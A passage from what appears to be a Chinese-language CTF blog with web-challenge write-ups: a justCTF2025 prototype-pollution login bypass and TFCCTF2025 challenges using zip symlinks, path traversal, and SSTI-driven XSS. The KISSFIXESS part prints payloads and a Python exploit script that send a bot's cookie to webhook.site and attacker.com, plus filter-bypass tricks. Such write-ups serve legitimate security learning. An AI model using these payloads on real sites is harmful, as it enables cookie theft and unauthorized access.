<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">toString</span>: &#123; <span class="attr">isAdmin</span>: <span class="string">&quot;1&quot;</span> &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>随后调用 <code>deepMerge</code> 函数合并对象时，会将 <code>&#123; isAdmin: &quot;1&quot; &#125;</code> 合并到 <code>Object.prototype.toString</code> 上，导致所有对象的 <code>toString.isAdmin</code> 被污染。下图是污染前后 的<code>toString</code> ，可以看到污染后的 <code>toString</code> 多了 <code>isAdmin</code> 属性，且值为1：</p>
<style>.qhtdqmbmtage{zoom:67%;}</style><img src="/2025/10/08/justCTF2025/image-20250812205418685.png" class="qhtdqmbmtage" alt="image-20250812205418685">



<ol start="2">
<li>登录为 <code>toString</code> 用户</li>
</ol>
<p>污染成功后，使用 <code>toString</code>用户名登录，<code>password</code>处随便填写，使用bp抓包后删除<code>password</code>字段后发送</p>
<p><img src="/../../../web/web/assets/Hd0U6gDwOppaItG8v85p62TsUvOTyCdV61yk8ThxbYM.png" alt="Hd0U6gDwOppaItG8v85p62TsUvOTyCdV61yk8ThxbYM"></p>
<p>页面跳转后说明登录成功，然后访问 &#x2F;flag 成功</p>
<p><img src="/2025/10/08/justCTF2025/gKArT-n1j8HpMhq69a5SQdMfXrSCd1B072R-nVOSWVA.png" alt="gKArT-n1j8HpMhq69a5SQdMfXrSCd1B072R-nVOSWVA"></p>
<h4 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h4><h5 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h5><ol>
<li>JS原型链污染漏洞利用及扩展</li>
<li>登录认证函数逻辑漏洞的识别与利用</li>
</ol>
<h5 id="关键技巧"><a href="#关键技巧" class="headerlink" title="关键技巧"></a>关键技巧</h5><ol>
<li><strong>原型污染扩展</strong>：</li>
</ol>
<p>​	利用原生属性（如 <code>toString</code>）绕过对 <code>__proto__</code> 的过滤。</p>
<p>​	通过 <code>deepMerge</code> 将污染扩散到原型链。</p>
<ol start="2">
<li><strong>认证函数逻辑漏洞</strong>：</li>
</ol>
<p>​	利用 <code>users</code> 对象继承 <code>Object.prototype</code> 的特性，使 <code>toString</code> 成为“已存在用户”。</p>
<p>​	通过 <code>undefined === undefined</code> 绕过密码检查。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://gist.github.com/terjanq/fa6f19d46bcb85bb61c146747dec0758#positive-players--write-up-by-terjanq">https://gist.github.com/terjanq/fa6f19d46bcb85bb61c146747dec0758#positive-players--write-up-by-terjanq</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/08/justCTF2025/" data-id="cuidT5qwmRvaiqEwgrJT4VupB" data-title="justCTF2025" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-TFCCTF2025" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/09/28/TFCCTF2025/" class="article-date">
  <time class="dt-published" datetime="2025-09-28T13:53:05.000Z" itemprop="datePublished">2025-09-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/09/28/TFCCTF2025/">TFCCTF2025 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="SLIPPY"><a href="#SLIPPY" class="headerlink" title="SLIPPY"></a>SLIPPY</h3><p><strong>一、题目描述</strong></p>
<p>打开靶机，可以上传ZIP压缩包，系统尝试解压并将成功解压的文件放置在 upload&#x2F; 目录下，供用户下载</p>
<style>.uuseyrpxxlxr{zoom: 80%;}</style><img src="/2025/09/28/TFCCTF2025/image-20250901091932761.png" class="uuseyrpxxlxr" alt="image-20250901091932761">

<p>根据Dockerfile，FLAG 存放在 &#x2F;xxxxxxx&#x2F;flag.txt下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN rand_dir=&quot;/$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)&quot;; mkdir &quot;$rand_dir&quot; &amp;&amp; echo &quot;TFCCTF&#123;Fake_fLag&#125;&quot; &gt; &quot;$rand_dir/flag.txt&quot; &amp;&amp; chmod -R +r &quot;$rand_dir&quot;</span><br></pre></td></tr></table></figure>

<p><strong>二、题目分析</strong></p>
<p>调试环境：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 docker</span></span><br><span class="line">docker run -it -p 3000:3000 -p 9229:9229 slippy node --inspect-brk=0.0.0.0:9229 server.js</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问chrome://inspect</span></span><br></pre></td></tr></table></figure>

<p>查看源码，分析相关处理逻辑</p>
<p>upload上传文件之后，通过<code>unzip</code>命令解压，然后存放在 <code>upload/session_userid/</code> 目录下</p>
<p>可能存在软链接读取文件，不存在zip slip路径穿越漏洞</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;zipfile&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> zipPath = req.<span class="property">file</span>.<span class="property">path</span>;      <span class="comment">// 上传文件暂存目录</span></span><br><span class="line">    <span class="comment">// 拼接解压缩的目标路径 upload/xxxxxxx</span></span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);   </span><br><span class="line">     <span class="comment">// Command: unzip temp/file.zip -d target_dir</span></span><br><span class="line">    <span class="title function_">execFile</span>(<span class="string">&#x27;unzip&#x27;</span>, [zipPath, <span class="string">&#x27;-d&#x27;</span>, userDir], <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">      fs.<span class="title function_">unlinkSync</span>(zipPath); <span class="comment">// Clean up temp file</span></span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Unzip failed:&#x27;</span>, stderr);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unzip error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/files&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>验证发现，此处通过软链接可以读取任意文件内容。可以通过软链接flag.txt，但不知道flag文件存在的目录</p>
<p>查看其它处理代码，访问 <code>/debug/files</code> 时，相关的处理代码存在路径穿越漏洞</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/debug/files&#x27;</span>, developmentOnly, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// session_id 存在路径穿越，可以获取任意目录下的文件列表</span></span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">query</span>.<span class="property">session_id</span>);</span><br><span class="line">    fs.<span class="title function_">readdir</span>(userDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading files&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;files&#x27;</span>, &#123; files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>但是访问该 <code>url</code> 需要先通过 <code>developmentOnly()</code> 方法的认证，条件时 <code>userId === ‘develop’</code> ，且 <code>req.ip == ‘127.0.0.1’</code></p>
<p>后者通过修改 <code>X-Forwarded-For</code> 可以满足，下面分析 <code>userId === ‘develop’</code> 的问题</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">userId</span> === <span class="string">&#x27;develop&#x27;</span> &amp;&amp; req.<span class="property">ip</span> == <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Forbidden: Development access only&#x27;</span>);</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>调试发现，<code>userId</code>是一串随机字符</p>
<p><img src="/2025/09/28/TFCCTF2025/image-20250901100930140.png" alt="image-20250901100930140"></p>
<p>发现 server.js 中有存放 develop 的sessionData：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Session</span></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> session.<span class="title class_">MemoryStore</span>();</span><br><span class="line"><span class="keyword">const</span> sessionData = &#123;</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">      <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">48</span> <span class="comment">// 1 hour</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">userId</span>: <span class="string">&#x27;develop&#x27;</span>   <span class="comment">// 用户名为 develop</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// store.set 保存sessionData的值</span></span><br><span class="line">store.<span class="title function_">set</span>(<span class="string">&#x27;&lt;REDACTED&gt;&#x27;</span>, sessionData, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Failed to create develop session:&#x27;</span>, err);</span><br><span class="line">    <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Development session created!&#x27;</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>可以通过前面的软链接读取 <code>server.js</code> ，进而获取保存的 <code>sessiondata</code></p>
<p>然后使用 <code>sha256</code> 计算得到 <code>develop</code> 的 <code>userId</code> </p>
<p>然后通过访问 <code>/debug/files</code> 获取存放 flag.txt 的目录名，然后再通过软件读取</p>
<p>获取FLAG的思路如下：</p>
<ol>
<li><p>软链接读取 <code>/app/.env</code> 和 <code>/app/server.js</code>，获取 <code>SESSION_SECRET</code> 和 <code>develop</code>的<code>sessionData</code></p>
</li>
<li><p><code>hmac</code> 计算 <code>develop</code> 的 <code>userId</code>，修改<code>host</code>为<code>127.0.0.1</code>，修改<code>cookie</code>为计算出的<code>userId</code>，访问 <code>debug/files</code> 利用路径穿越漏洞获取存放 <code>flag.txt</code> 的目录</p>
</li>
</ol>
<p><img src="/2025/09/28/TFCCTF2025/image-20250901105312884.png" alt="image-20250901105312884"></p>
<p>存放flag.txt的目录：</p>
<style>.plwoyqovnurp{zoom:80%;}</style><img src="/2025/09/28/TFCCTF2025/image-20250901105053972.png" class="plwoyqovnurp" alt="image-20250901105053972">

<ol start="3">
<li>利用软链接读取 &#x2F;tlhedn6f&#x2F;flag.txt 文件，获取FLAG</li>
<li><style>.hcauxcmswfgf{zoom:80%;}</style><img src="/2025/09/28/TFCCTF2025/image-20250901105617324.png" class="hcauxcmswfgf" alt="image-20250901105617324"></li>
</ol>
<h3 id="KISSFIXESS"><a href="#KISSFIXESS" class="headerlink" title="KISSFIXESS"></a>KISSFIXESS</h3><p><strong>一、题目描述</strong></p>
<p>模板渲染，用户输入 Name ，服务端渲染成不同颜色</p>
<style>.bsyasvmqptqn{zoom:80%;}</style><img src="/2025/09/28/TFCCTF2025/image-20250901211720915.png" class="bsyasvmqptqn" alt="image-20250901211720915">

<p>分析源码发现，模拟管理员访问<code>URL</code>的机器人 bot.py，显示 <code>flag</code> 被当作<code>cookie</code>存放</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">driver.add_cookie(&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;TFCCTF&#123;~&#125;&quot;</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>二、题目分析</strong></p>
<p>通过源码分析，该服务端使用 <code>http.server</code> + <code>Mako</code> 模板渲染，用户输入通过 GET 请求 <code>name_input</code> 参数提交，页面上有一个  “Report Name” 按钮，点击后会发 POST 请求 <code>/report</code>。<code>/report</code> 处理函数会调用 机器人 <code>bot.py</code> 的 <code>visit_url</code> 函数访问指定 URL。</p>
<p>用户输入<code>Name</code>被保存在变量 <code>name_to_display</code> ，在渲染之前有2处过滤：</p>
<p><code>banned</code> 黑名单字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 禁止危险字符</span></span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment"># 过滤危险字符，不能使用 self,(),.,import等</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> b <span class="keyword">in</span> name:</span><br><span class="line">            name = <span class="string">&quot;Banned characters detected!&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(b)</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment"># render_page函数调用escape_html，后者在渲染页面时禁止 “&amp;&lt;&gt;()”</span></span><br><span class="line">    <span class="variable language_">self</span>.wfile.write(render_page(name_to_display=name).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>**绕过：**L和S，JS语言的Function构造器（<code>Function(&quot;...&quot;)()</code> 会把字符串里的代码当成 JavaScript 来运行）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;console.log(&#x27;hi&#x27;)&quot;</span>)()</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hi&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>escape_html</code> 函数： 对用户输入的字符串进行转义（escape），以防止浏览器把它当成 <code>HTML</code> 或 <code>JavaScript</code> 解析，防止<code>XSS</code>攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">escape_html</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Escapes HTML special characters in the given text.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;)   # 把 &amp; 转义为 &amp;amp;</span></span><br><span class="line"><span class="string">       .replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;)    # 把 &lt; 转义为 &amp;lt;  (防止开始标签)</span></span><br><span class="line"><span class="string">       .replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;)    # 把 &gt; 转义为 &amp;gt;  (防止结束标签)</span></span><br><span class="line"><span class="string">       .replace(&quot;(&quot;, &quot;&amp;#40;&quot;)   # 把 ( 转义为 &amp;#40; (避免JS函数调用)</span></span><br><span class="line"><span class="string">       .replace(&quot;)&quot;, &quot;&amp;#41;&quot;))  # 把 ) 转义为 &amp;#41;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> text.replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>).replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>).replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&amp;#40;&quot;</span>).replace(<span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#41;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后被过滤或转义的 <code>name_to_display</code> 被当作参数，传入<code>template.render</code>函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">name_to_display=<span class="literal">None</span></span>):</span><br><span class="line">    templ = html_template.replace(<span class="string">&quot;NAME&quot;</span>, escape_html(name_to_display <span class="keyword">or</span> <span class="string">&quot;&quot;</span>))</span><br><span class="line">    template = Template(templ, lookup=lookup)</span><br><span class="line">    <span class="keyword">return</span> template.render(name_to_display=name_to_display, banned=<span class="string">&quot;&amp;&lt;&gt;()&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>**绕过：**构造映射关系</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过精心构造，用户输入<code>name_to_display</code>可以走到页面渲染<code>template.render</code>函数，存在SSTI</p>
<p>**解题思路：**利用SSTI漏洞将恶意链接（作用是获取网页Cookie并发送到指定域名）渲染到服务端返回的HTML中，然后通过POST请求 <code>/report</code>调用机器人访问该恶意链接，将机器人的Cookie（即flag）发送到指定域名</p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&quot;  https://webhook.site/0b99fcd3-6f53-4906-889a-3e7fd8b19a84/?x=&quot;</span>)+document.cookie</span><br></pre></td></tr></table></figure>

<p>当浏览器执行这段代码时，就会把用户 Cookie 传送到 <code>https://webhook.site/0b99fcd3-6f53-4906-889a-3e7fd8b19a84</code></p>
<p>通过加入<code>空格</code>绕过base64编码后存在 <code>l</code> 和 <code>s</code> 的问题，使用上述绕过方法，最终的payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;banned[1]&#125;SCRIPT$&#123;banned[2]&#125;Function$&#123;banned[3]&#125;atob$&#123;banned[3]&#125;`ICBmZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvMGI5OWZjZDMtNmY1My00OTA2LTg4OWEtM2U3ZmQ4YjE5YTg0Lz92Yz0nK2RvY3VtZW50LmNvb2tpZSkg`$&#123;banned[4]&#125;$&#123;banned[4]&#125;$&#123;banned[3]&#125;$&#123;banned[4]&#125;$&#123;banned[1]&#125;/SCRIPT$&#123;banned[2]&#125;</span><br></pre></td></tr></table></figure>

<p>将payload作为Name输入，服务器端返回的页面包含：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;fetch(&#x27;https://attacker.com?x=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>机器人bot.py访问该页面时：HTML 被解析，<code>&lt;iframe&gt;</code> 加载时触发 <code>onload</code>，<code>fetch()</code> 调用执行，浏览器（或机器人）发送 cookie 到指定域名，获取cookie</p>
<p><img src="/2025/09/28/TFCCTF2025/76564239253c115e5fd5196ea43a8f5.png" alt="76564239253c115e5fd5196ea43a8f5"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">js_inner = <span class="string">&#x27;fetch(&quot;  https://webhook.site/0b99fcd3-6f53-4906-889a-3e7fd8b19a84/?x=&quot;)+document.cookie&#x27;</span></span><br><span class="line">js_base = base64.b64encode(js_inner.encode()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">js = <span class="string">f&quot;&quot;&quot;Function(atob(`<span class="subst">&#123;js_base&#125;</span>`))()&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(js)</span><br><span class="line"></span><br><span class="line">to_enc = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;iframe onLoad=&#x27;JAVASCRIPT:<span class="subst">&#123;js&#125;</span>&#x27; &gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(to_enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">25</span>)</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> mapping.keys():</span><br><span class="line">    to_enc = to_enc.replace(key, mapping[key])</span><br><span class="line"><span class="built_in">print</span>(to_enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">15</span>)</span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>]</span><br><span class="line"></span><br><span class="line">ban_doesnt_trigger = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> banned:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> to_enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;BAN | <span class="subst">&#123;c&#125;</span> | found&#x27;</span>)</span><br><span class="line">        ban_doesnt_trigger= <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> ban_doesnt_trigger:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All good&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="KISSFIXSSREVENGE"><a href="#KISSFIXSSREVENGE" class="headerlink" title="KISSFIXSSREVENGE"></a>KISSFIXSSREVENGE</h3><p>过滤条件更严格</p>
<p><code>banned</code> 黑名单字符</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">KISSFIXESS</span></span><br><span class="line">banned = [&quot;s&quot;, &quot;l&quot;, &quot;(&quot;, &quot;)&quot;, &quot;self&quot;, &quot;_&quot;, &quot;.&quot;, &quot;\&quot;&quot;, &quot;\\&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;os&quot;, &quot;;&quot;, &quot;,&quot;, &quot;|&quot;]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">KISSFIXESSREVENGE</span></span><br><span class="line">banned = [&quot;s&quot;, &quot;l&quot;, &quot;(&quot;, &quot;)&quot;, &quot;self&quot;, &quot;_&quot;, &quot;.&quot;, &quot;\&quot;&quot;, &quot;\\&quot;, &quot;&amp;&quot;, &quot;%&quot;, &quot;^&quot;, &quot;#&quot;, &quot;@&quot;, &quot;!&quot;, &quot;*&quot;, &quot;-&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;os&quot;, &quot;;&quot;, &quot;,&quot;, &quot;|&quot;, &quot;JAVASCRIPT&quot;, &quot;window&quot;, &quot;atob&quot;, &quot;btoa&quot;, &quot;=&quot;]</span><br></pre></td></tr></table></figure>

<p>绕过方法：</p>
<ol>
<li>大小写：<code>L</code>和<code>S</code></li>
<li><code>JS</code>语言的<code>Function</code>构造器：<code>Function(&quot;...&quot;)()</code> 会把字符串里的代码当成 JavaScript 来运行</li>
